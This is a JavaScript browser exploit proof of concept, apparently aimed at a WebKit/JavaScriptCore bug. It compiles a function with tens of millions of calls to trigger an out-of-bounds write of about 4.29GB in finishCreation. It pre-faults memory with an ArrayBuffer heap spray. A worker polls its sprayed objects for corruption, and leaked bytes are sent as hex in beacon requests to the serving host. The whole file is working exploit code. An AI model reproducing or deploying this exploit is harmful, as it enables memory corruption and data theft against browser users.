// p153 — Pre-fault 4GB forward range before calling the function
// PROBLEM: finishCreation writes 4.29GB forward. Process dies hitting unmapped pages.
// FIX: Spray ~2GB of ArrayBuffers AFTER script compilation but BEFORE function call.
//   This maps the virtual address range. finishCreation writes through our ABs.
//   Worker polls for corruption in its own heap objects.
// Beacon prefix: V153-

(function() {
  var BASE = location.protocol + '//' + location.host;

  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V153-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch (e) {}
  }

  B('BOOT');

  // Worker code
  var workerCode = [
    'var BASE = "' + BASE + '";',
    'var STR_LEN = 100076;',
    'var U8_SZ = 64;',
    '',
    'function beacon(tag) {',
    '  try {',
    '    var x = new XMLHttpRequest();',
    '    x.open("GET", BASE + "/beacon/V153-W-" + tag + "?t=" + Date.now(), true);',
    '    x.send();',
    '  } catch(e) { self.postMessage("BF:" + tag); }',
    '}',
    'function hexByte(v) { return (v < 16 ? "0" : "") + v.toString(16); }',
    '',
    'var strs = [];',
    'for (var i = 0; i < 40; i++) {',
    '  strs.push(String.fromCharCode(0x41).repeat(STR_LEN));',
    '  strs[i].charCodeAt(0);',
    '}',
    'var u8s = [];',
    'for (var i = 0; i < 60; i++) {',
    '  var u = new Uint8Array(U8_SZ);',
    '  for (var j = 0; j < U8_SZ; j++) u[j] = 0xBB;',
    '  u8s.push(u);',
    '}',
    '',
    'beacon("READY-S" + strs.length + "-U" + u8s.length);',
    'self.postMessage("READY");',
    '',
    'var reported = {};',
    'var pollN = 0;',
    '',
    'function poll() {',
    '  pollN++;',
    '  var sH = 0, uH = 0;',
    '  for (var i = 0; i < strs.length; i++) {',
    '    try {',
    '      var len = strs[i].length;',
    '      if (len !== ' + String(100076) + ' && !reported["s"+i]) {',
    '        sH++; reported["s"+i] = 1;',
    '        beacon("S"+i+"-len="+len+"-p="+pollN);',
    '        if (len > 0 && len < 500000) {',
    '          var h = "";',
    '          for (var j = 0; j < Math.min(32,len); j++) {',
    '            try { h += hexByte(strs[i].charCodeAt(j)); } catch(e) { h += "XX"; break; }',
    '          }',
    '          beacon("SD"+i+"-"+h);',
    '        }',
    '      }',
    '    } catch(e) { if(!reported["se"+i]){sH++;reported["se"+i]=1;beacon("SERR"+i);} }',
    '  }',
    '  for (var i = 0; i < u8s.length; i++) {',
    '    try {',
    '      if ((u8s[i][0] !== 0xBB || u8s[i].length !== ' + String(64) + ') && !reported["u"+i]) {',
    '        uH++; reported["u"+i] = 1;',
    '        var v0 = u8s[i][0], vL = u8s[i].length;',
    '        beacon("U"+i+"-v0="+hexByte(v0)+"-len="+vL+"-p="+pollN);',
    '        var h = "";',
    '        for (var j = 0; j < Math.min(128,vL); j++) {',
    '          try { h += hexByte(u8s[i][j]); } catch(e) { h += "XX"; break; }',
    '        }',
    '        for (var c = 0; c < h.length; c += 120) beacon("UD"+i+"-"+c+"-"+h.substring(c,c+120));',
    '      }',
    '    } catch(e) { if(!reported["ue"+i]){uH++;reported["ue"+i]=1;beacon("UERR"+i);} }',
    '  }',
    '  if (sH > 0 || uH > 0) {',
    '    beacon("FOUND-S"+sH+"-U"+uH+"-p="+pollN);',
    '    return;',
    '  }',
    '  if (pollN < 15000) setTimeout(poll, 1);',
    '  else beacon("TIMEOUT-"+pollN);',
    '}',
    'setTimeout(poll, 5);',
  ].join('\n');

  var worker = new Worker(URL.createObjectURL(new Blob([workerCode], {type:'application/javascript'})));
  worker.onmessage = function(ev) { B('WM-' + String(ev.data).substring(0,80)); };
  B('WORKER-CREATED');

  var ready = false;
  worker.addEventListener('message', function h(ev) {
    if (ev.data === 'READY') { ready = true; worker.removeEventListener('message', h); }
  });

  setTimeout(function() {
    if (!ready) B('WORKER-SLOW');
    phase1();
  }, 2000);

  function phase1() {
    // Step 1: Compile the script (creates global CodeBlock only, NOT the function's)
    var N = 38348816;
    B('BUILD');

    var CHUNK = 4000000;
    var chunksN = Math.floor(N / CHUNK);
    var rem = N - chunksN * CHUNK;
    var callChunk = 'a();'.repeat(CHUNK);
    var parts = new Array(chunksN + 3);
    parts[0] = 'window.__p153fn=function(a){';
    for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
    parts[chunksN + 1] = 'a();'.repeat(rem);
    parts[chunksN + 2] = '};window.__p153ok=1;';
    callChunk = null;

    var blob = new Blob(parts, {type:'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    sc.onload = function() {
      B('COMPILED-' + (window.__p153ok ? 'OK' : 'FAIL'));
      if (!window.__p153fn) { B('NO-FN'); return; }
      setTimeout(phase2, 100);
    };
    document.head.appendChild(sc);
    sc.src = URL.createObjectURL(blob);
  }

  function phase2() {
    // Step 2: Pre-fault memory — spray large ABs to map the forward range
    // The metadata buffer will be ~100KB, allocated in marge.
    // finishCreation writes 4.29GB forward from it.
    // We spray to ensure that range is mapped.
    B('PREFAULT-START');

    var prefaultABs = [];
    var totalMB = 0;
    var targetMB = 1500; // 1.5GB of pre-fault spray

    try {
      while (totalMB < targetMB) {
        // 4MB chunks — matches marge page size
        var ab = new ArrayBuffer(4 * 1024 * 1024);
        // Touch it to fault pages in
        var v = new Uint8Array(ab);
        v[0] = 0xDD;
        v[v.length - 1] = 0xDD;
        prefaultABs.push(ab);
        totalMB += 4;
      }
    } catch (e) {
      // OOM — that's fine, we mapped what we could
    }
    B('PREFAULT-' + totalMB + 'MB-' + prefaultABs.length + 'abs');

    // Step 3: Call the function — triggers finishCreation + 4.29GB OOB write
    // Worker is polling. finishCreation writes through our pre-faulted region
    // AND through Worker's MarkedSpace if it's in the forward range.
    setTimeout(function() {
      B('CALLING');
      try {
        window.__p153fn(function(){});
        B('SURVIVED');
      } catch (ex) {
        B('CATCH-' + String(ex).substring(0, 60));
      }
      B('AFTER-CALL');
    }, 200);
  }
})();
